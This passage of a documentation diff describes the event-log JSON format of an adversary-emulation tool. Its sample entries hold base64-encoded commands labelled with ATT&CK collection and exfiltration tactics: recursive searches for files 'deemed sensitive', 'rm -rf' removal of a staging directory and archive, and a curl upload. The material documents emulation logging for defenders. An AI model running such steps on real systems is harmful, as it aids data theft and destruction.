+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1357    0     0  100  1357      0   441k --:--:-- --:--:-- --:--:--  441k&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57568</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:14:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;300157e5-f4ad-4569-b533-9d1fa0e74d74&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:15:01Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;exfiltration&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1560.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Archive Collected Data: Archive via Utility&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;cm0gL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neg==&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:14:07Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Compress a directory on the file system&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;e58dc3e6-b3a2-4657-aba0-f2f719a35041&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Compress staged directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57769</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:15:01Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;6469befa-748a-4b9c-a96d-f191fde47d89&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:15:03Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;cm0gLXJmIHN0YWdlZA==&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:14:07Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;create a directory for exfil staging&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;cdd17a43-2e06-4be4-b361-c3291cdb3f6a&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Create staging directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57773</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:15:03Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">]</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="operation-event-logs">
+<h2>Operation Event Logs<a class="headerlink" href="#operation-event-logs" title="Permalink to this heading">¶</a></h2>
+<p>The operation event logs JSON file can be downloaded via the <code class="docutils literal notranslate"><span class="pre">Download</span> <span class="pre">event</span> <span class="pre">logs</span></code> button on the operations modal after selecting an operation from the drop-down menu. To include command output, users should select the <code class="docutils literal notranslate"><span class="pre">include</span> <span class="pre">agent</span> <span class="pre">output</span></code> option. Operation event logs will also be automatically written to disk when an operation completes - see the section on <a class="reference internal" href="#automatic-event-log-generation"><span class="std std-doc">automatic event log generation</span></a>.</p>
+<p>The event logs JSON is a list of dictionary objects, where each dictionary represents an event that occurred during the operation (i.e. each link/command). Users can think of this as a “flattened” version of the operation steps displayed in the traditional report JSON format. However, not all of the operation or agent metadata from the operation report is included in the operation event logs. The event logs do not include operation facts, nor do they include operation links/commands that were skipped either manually or because certain requirements were not met (e.g. missing facts or insufficient privileges). The event log JSON format makes it more convenient to import into databases or SIEM tools.</p>
+<p>The event dictionary has the following keys and values:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">command</span></code>: base64-encoded command that was executed</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">delegated_timestamp</span></code>: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation made the link available for collection</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">collected_timestamp</span></code>: Timestamp in YYYY-MM-DD HH:MM:SS format that indicates when the agent collected the link available for collection</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">finished_timestamp</span></code>: Timestamp in YYYY-MM-DD HH:MM:SS format that indicates when the agent submitted the link execution results to the C2 server.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">status</span></code>: link execution status</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">platform</span></code>: target platform for the agent running the link (e.g. “windows”)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">executor</span></code>: executor used to run the link command (e.g. “psh” for powershell)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">pid</span></code>: process ID for the link</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">agent_metadata</span></code>: dictionary containing the following information for the agent that ran the link:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">paw</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">group</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">architecture</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">username</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">location</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">pid</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ppid</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">privilege</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">host</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">contact</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">created</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_metadata</span></code>: dictionary containing the following information about the link ability:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_id</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_name</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_description</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">operation_metadata</span></code>: dictionary containing the following information about the operation that generated the link event:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">operation_name</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">operation_start</span></code>: operation start time in YYYY-MM-DD HH:MM:SS format</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">operation_adversary</span></code>: name of the adversary used in the operation</p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">attack_metadata</span></code>: dictionary containing the following ATT&amp;CK information for the ability associated with the link:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">tactic</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">technique_id</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">technique_name</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">output</span></code>: if the user selected <code class="docutils literal notranslate"><span class="pre">include</span> <span class="pre">agent</span> <span class="pre">output</span></code> when downloading the operation event logs, this field will contain a dictionary of the agent-provided output from running the link command.</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">stdout</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">stderr</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">exit_code</span></code></p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">agent_reported_time</span></code>: Timestamp string representing the time at which the execution was ran by the agent in YYYY-MM-DD HH:MM:SS format. This field will not be present if the agent does not support reporting the command execution time.</p></li>
+</ul>
+<p>Below is a sample output for operation event logs:</p>
+<div class="section" id="sample-event-logs">
+<h3>Sample Event Logs<a class="headerlink" href="#sample-event-logs" title="Permalink to this heading">¶</a></h3>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">[</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLnBuZyAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;delegated_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:12Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;collected_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:14Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;finished_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:14Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;windows&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;psh&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">7016</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;agent_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pertbn&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;red&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;architecture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;amd64&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BYZANTIUM\\Carlomagno&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;C:\\Users\\Public\\sandcat.exe&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5896</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2624</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Elevated&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WORKSTATION1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:48:33Z&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;ability_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find files&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Locate files deemed sensitive&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;operation_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;operation_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Operation&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:12Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_adversary&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Collection&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;attack_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data from Local System&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:13Z&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLnltbCAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;delegated_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:17Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;collected_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:21Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;finished_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:21Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;windows&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;psh&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1048</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;agent_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pertbn&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;red&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;architecture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;amd64&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BYZANTIUM\\Carlomagno&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;C:\\Users\\Public\\sandcat.exe&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5896</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2624</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Elevated&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WORKSTATION1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:48:33Z&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;ability_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find files&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Locate files deemed sensitive&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;operation_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;operation_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Operation&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:12Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_adversary&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Collection&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;attack_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data from Local System&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:18Z&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLndhdiAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;delegated_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:22Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;collected_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:27Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;finished_timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:27Z&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;windows&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;psh&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5964</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;agent_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pertbn&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;red&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;architecture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;amd64&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BYZANTIUM\\Carlomagno&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;C:\\Users\\Public\\sandcat.exe&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5896</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2624</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Elevated&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WORKSTATION1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:48:33Z&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;ability_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find files&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ability_description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Locate files deemed sensitive&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;operation_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;operation_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Operation&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:12Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;operation_adversary&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Collection&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;attack_metadata&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data from Local System&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-02-23T11:50:25Z&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="p">{</span>
